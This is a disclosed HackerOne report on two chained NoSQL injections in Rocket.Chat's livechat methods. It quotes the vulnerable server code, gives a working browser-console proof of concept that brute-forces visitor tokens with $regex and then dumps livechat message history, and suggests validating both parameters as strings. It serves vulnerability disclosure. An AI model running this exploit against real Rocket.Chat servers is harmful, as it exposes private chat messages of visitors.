# NoSQL injection leaks visitor token and livechat messages

## Report Details
- **Report ID**: 2580062
- **URL**: https://hackerone.com/reports/2580062
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-06-27T17:35:31.411Z
- **Disclosed**: 2024-07-11T21:53:52.143Z

## Reporter
- **Username**: gronke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
## Summary

Livechat messages can be leaked by combining two NoSQL injections affecting `livechat:loginByToken` (pre-authentication) and `livechat:loadHistory`.

## Description

The `token` parameter of the `livechat:loginByToken` method is not validated and allows NoSQL injection, for instance [`$regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/) to efficiently leak existing livechat visitor token 

[apps/meteor/app/livechat/server/methods/loginByToken.ts#L17](https://github.com/RocketChat/Rocket.Chat/blob/dbc79b76164c211eda3cf47b74a6aa94d8831abe/apps/meteor/app/livechat/server/methods/loginByToken.ts#L17)

```javascript
Meteor.methods<ServerMethods>({
  async 'livechat:loginByToken'(token) {
    methodDeprecationLogger.method('livechat:loginByToken', '7.0.0');
    const visitor = await LivechatVisitors.getVisitorByToken(token, { projection: { _id: 1 } });

    if (!visitor) {
      return;
    }

    return {
      _id: visitor._id,
    };
  },
});
```

With a known visitor token, an authenticated adversary can load the message history by guessing a room ID or using another NoSQL injection in this methods `rid` parameter. The method requires a valid visitor token, which is known from the first step.

[apps/meteor/app/livechat/server/methods/loadHistory.ts#L30](https://github.com/RocketChat/Rocket.Chat/blob/dbc79b76164c211eda3cf47b74a6aa94d8831abe/apps/meteor/app/livechat/server/methods/loadHistory.ts#L30)

```javascript
Meteor.methods<ServerMethods>({
  async 'livechat:loadHistory'({ token, rid, end, limit = 20, ls }) {
    methodDeprecationLogger.method('livechat:loadHistory', '7.0.0');

    if (!token || typeof token !== 'string') {
      return;
    }

    const visitor = await LivechatVisitors.getVisitorByToken(token, { projection: { _id: 1 } });

    if (!visitor) {
      throw new Meteor.Error('invalid-visitor', 'Invalid Visitor', {
        method: 'livechat:loadHistory',
      });
    }

    const room = await LivechatRooms.findOneByIdAndVisitorToken(rid, token, { projection: { _id: 1 } });
    if (!room) {
      throw new Meteor.Error('invalid-room', 'Invalid Room', { method: 'livechat:loadHistory' });
    }

    return loadMessageHistory({ userId: visitor._id, rid, end, limit, ls });
  },
});
```

## Releases Affected:

  * https://open.rocket.chat
  * `develop`

## Steps To Reproduce:

  1. Login to a Rocket.Chat appliance with Livechat enabled (e.g. https://open.rocket.chat)
  2. Open Web Inspector
  3. Execute Proof-of-Concept

## Proof of Concept

```javascript
var pool = "0123456789abcdef";
var rate_limit = 4; // requests per second

var guessVisitorToken = (knownValid, guesses) => {
  return new Promise((resolve, reject) => {
    if (!guesses.length) {
      return reject();
    }
    const guess = { "$regex": `^${knownValid}[${guesses}]` };
    console.log("Meteor.call", "livechat:loginByToken", guess);
    Meteor.call("livechat:loginByToken", guess, async (err, data) => {
      await new Promise((resolve) => setTimeout(() => resolve(), (1000 / rate_limit)));
      if (err) {
        console.error(err);
        return reject(err);
      }
      if ((data instanceof Object) && data.hasOwnProperty("_id")) {
        resolve(guesses)
      } else {
        reject();
      }
    });
  });
};

var bruteforceVisitorToken = async (knownValid="") => {

  let remainingPool = pool;
  while (true) {
    await new Promise((resolve) => setTimeout(() => resolve(), (1000 / rate_limit)));
    if (remainingPool.length === 0) {
      throw new Error("empty pool");
    } else if (remainingPool.length === 1) {
      await guessVisitorToken(knownValid, remainingPool);
      knownValid += remainingPool[0];
      remainingPool = pool;
      continue;
    } else {
      const middle = Math.ceil(remainingPool.length / 2);
      const left = remainingPool.slice(0, middle);
      const right = remainingPool.slice(middle);
      try {
        await guessVisitorToken(knownValid, left);
        remainingPool = left;
        continue;
      } catch(err) {}

      try {
        await guessVisitorToken(knownValid, right);
        remainingPool = right;
        continue
      } catch(err) {}
      return knownValid;
    }
  }
}

const { messages, token } = await bruteforceVisitorToken("")
  .then((token) => {
    console.log("Token leaked", token);
    return new Promise((resolve, reject) => {
      Meteor.call("livechat:loadHistory", { token, rid: { "$regex": ".*" } }, (err, messages) => {
        if (err) {
          console.log("failed to leak messages");
          return reject();
        }
        resolve({ token, messages })
      })
    });
  })
  .catch(console.error);

console.log({ token, messages });
```

## Suggested mitigation

  * Validate `token` parameter of`livechat:loginByToken` method to be a String.
  * Validate `rid` parameter of `livechat:loadHistory` method to be a String.

## Impact

Unauthenticated attackers can leak visitor token on Rocket.Chat appliances with Livechat enabled by using a NoSQL injection in the `token` parameter of the `livechat:loginByToken` method. Combined with another NoSQL injection in the `rid` parameter of the `livechat:loadHistory` method, all Livechat messages can be leaked.

## Attachments
No attachments
